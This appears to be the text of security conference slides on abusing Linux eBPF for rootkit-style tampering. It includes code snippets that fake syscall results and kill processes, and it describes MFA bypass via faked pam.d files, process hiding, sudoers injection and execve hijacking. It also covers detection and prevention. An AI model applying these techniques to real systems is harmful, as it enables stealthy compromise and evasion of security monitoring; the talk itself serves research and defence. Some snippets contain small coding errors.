eBPF - Warping Data Reality
bpf_probe_write_user
●
Any user space buffer, pointer, or string can be overwritten
●
E.g. execve, connect, netlink data, etc.
fmod_ret programs
●
Special type of eBPF programs to override function calls
●
Only some kernel functions, all syscalls
●
Doesn’t call function, instead return error or fake result
●
Most software silently fails (sshd, rsyslogd, etc.)
bpf_send_signal
●
eBPF helper function
●
Raises a signal on current thread
●
Signal SIGKILL unstoppable, kills entire process
SEC("fmod_ret/__x64_sys_write")
int BPF_PROG(fake_write, struct pt_regs *regs)
{
    // Get expected write amount
    u32 count = PT_REGS_PARM3(regs);
    // Overwrite return
    return count;
}
@pathtoﬁle
SEC("fentry/__x64_sys_openat")
int BPF_PROG(bpf_dos, struct pt_regs *regs)
{
    // Kill any program that attempts to open a file
    bpf_send_signal(SIGKILL);
    return 0;
}
eBPF - Warping Data Reality
@pathtoﬁle
SEC("fexit/__x64_sys_read")
int BPF_PROG(read_exit, struct pt_regs *regs, long ret) {
    // Check Process ID
    int pid = bpf_get_current_pid_tgid() >> 32;
    // Check Program name
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm);
    // Check user ID
    int uid = (int)bpf_get_current_uid_gid();
    // Check function argument
    char data[100];
    bpf_probe_read_user(&data, sizeof(data), PT_REGS_PARM2(regs));
    // Check return Value
    if (ret != 0)  { /* ... */ };
    return 0;
}
●
Can programmatically determine when 
to affect calls 
●
Can ﬁlter based on:
●
Process ID
●
Process name
●
User ID
●
Function arguments
●
Function return
●
Time since boot
●
Previous activity
●
...
eBPF - Warping Data Reality
eBPF enables
●
Bypassing MFA by faking pam.d ﬁles
●
Enabling access using fake 
credentials
Security observes
●
cat, vim, etc. only see real data without 
fake user
@pathtoﬁle
Demo Time
Other features,
Limitations
eBPF - Other features
Running on network hardware
●
eBPF can run outside the OS on the network card
●
Dependent on card model
●
Able to alter packets after auditing from OS
Programs can persist after loader exit
●
Some programs can be pinned to
/sys/fs/bpf/
●
Fentry, Fexit programs
●
If pinned, loader not longer required
●
Otherwise loader needs to continue to run
●
Reduces detectable footprint
Chaining eBPF programs together
●
bpf_tail_call
●
Increases complexity
●
eBPF Maps used to store state between calls
@pathtoﬁle
eBPF - Limitations
Race conditions
●
If usermode process runs too quickly, tampering fails
●
Process could race on another thread to discover/defeat tampering
No persistence across reboots
●
Programs need to be re-loaded after every reboot
Cannot write to kernel memory
●
Not able to alter kernel memory
●
Kernel security products (e.g. AuditD) unaffected
●
Kernel raises warning when ‘bpf_probe_write_user’ is used
●
However, can tamper with user mode controllers, log readers, network traﬃc, etc.
@pathtoﬁle
Detections and
Preventions
eBPF - File Detections
●
Look for ﬁles that contain eBPF 
programs
●
Easy if programs compiled using 
LLVM + LibBPF
○
But not the only way to load 
eBPF Programs
●
If using bpftool + libbpf,
ELF baked into loader .rodata
@pathtoﬁle
eBPF - File Detections
●
Look for ﬁles that contain eBPF 
programs
●
Easy if programs compiled using 
LLVM + LibBPF
○
But not the only way to load 
eBPF Programs
●
If using bpftool + libbpf,
ELF baked into loader .rodata
@pathtoﬁle
eBPF - File Detections
●
Look for programs calling bpf_probe_write_user
●
BPF Bytecode:
●
Native bytecode:
@pathtoﬁle
On Disk:    85 00 00 00 24 00 00 00
In kernel:  85 00 00 00 40 FE FE FF
In Kernel:  callq  0xffff....
eBPF - Process Detections
Process Monitoring
●
Monitor all ‘bpf’ syscalls
○
Only trusted programs should be using eBPF
○
Can use eBPF to monitor itself
●
Can use eBPF to extract program bytecode during 
loading
@pathtoﬁle
SEC("tp/syscalls/sys_enter_bpf")
int bpf_dos(struct trace_event_raw_sys_enter *ctx)
{
    // Get current program filename
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    // Check program name
    char comm_check[TASK_COMM_LEN] = "bpftool";
    for (int i = 0; i < TASK_COMM_LEN; i++) {
        if (prog_name[i] != comm_check[i]) {
            // Program name doesn't match
            // kill process
            bpf_send_signal(SIGKILL);
            return 0;
        }
    }
    // bpftool is ok to run
    return 0;
}
eBPF - Memory Detections
@pathtoﬁle
●
Volatility planning to release new memory scanning plugins
●
Volatility works on live and oﬄine memory dumps
eBPF - Preventions
●
eBPF can be disabled
○
Requires re-building kernel
○
Not always an option (e.g. managed environments)
●
eBPF community is discussing how to sign eBPF programs
○
Signing can prevent unauthorised eBPF usage
○
Diﬃcult due to JIT compilation
○
When implemented, it impact how eBPF can be used
@pathtoﬁle
What else can eBPF do?
eBPF - Windows
●
eBPF is on Windows now
●
Currently only network routing
●
Future plans for function hooks
●
Writing to user memory not discussed
●
But the future is interesting!
@pathtoﬁle
https://cloudblogs.microsoft.com/opensource/2021/05/10/making-ebpf-work-on-windows/
eBPF - Anti-Anti-Sandboxing
●
eBPF a great tool to defeat Anti-Sandbox and Anti-RE
●
Doesn’t require attaching to processes
●
Can fake uptime, ﬁle contents, MAC Address, DNS responses, etc.
●
Examples of Anti-Sandbox techniques:
@pathtoﬁle
https://www.trustedsec.com/blog/enumerating-anti-sandboxing-techniques/ 
eBPF - Bad-BPF
●
https://github.com/pathtoﬁle/bad-bpf 
●
Collection of eBPF programs and loaders
●
Lots of comments and details on how they work
●
Examples of ﬁltering based on PID and process name
@pathtoﬁle
Sudo-Add:
Adds a user to sudoers list
TCP-Reroute:
Route TCP traﬃc from magic source port across NICs
Text-Replace:
Replaces arbitrary text in arbitrary ﬁles.
- Add users to /etc/passwd
- Hide kernel modules from ‘lsmod’
           - Fake MAC Address, etc.
Bpf-Dos:
Kills any program trying to use eBPF
Exec-Hijack:
Hijacks calls to execve to launch a different program
Pid-Hide:
Hides processes from tools like ‘ps’
Conclusion
eBPF - Conclusion
●
Using Kernel Rootkits can be super risky for an attacker
●
eBPF removes this risk, making it possible to run safe, portable, rootkits
●
Detection and prevention can be diﬃcult without kernel mode security
Links:
●
Code Samples: 
https://github.com/pathtoﬁle/bad-bpf
●
Docs and blogs:
https://blog.toﬁle.dev/categories/#ebpf
●
eBPF Community Website: 
https://ebpf.io
●
eBPF Community Slack: 
https://ebpf.io/slack
●
eBPF Technical Guides:
https://docs.cilium.io/en/v1.9/bpf/#bpf-guide
https://github.com/iovisor/bpf-docs/blob/master/eBPF.md
●
Other eBPF talks:
DEF CON 27: Jeff Dileo - Evil eBPF
DEF CON 29: Guillaume Fournier - eBPF, I thought we were friends!
InfoQ 2020:Thomas Graf - Rethinking the Linux Kernel
●
Mega thanks
Cory, Maybe, family
@pathtoﬁle
Questions?
Website:
https://path.toﬁle.dev
GitHub, Slack, Twitter:
@PathToFile
Email:
path[at]toﬁle[dot]dev
@pathtoﬁle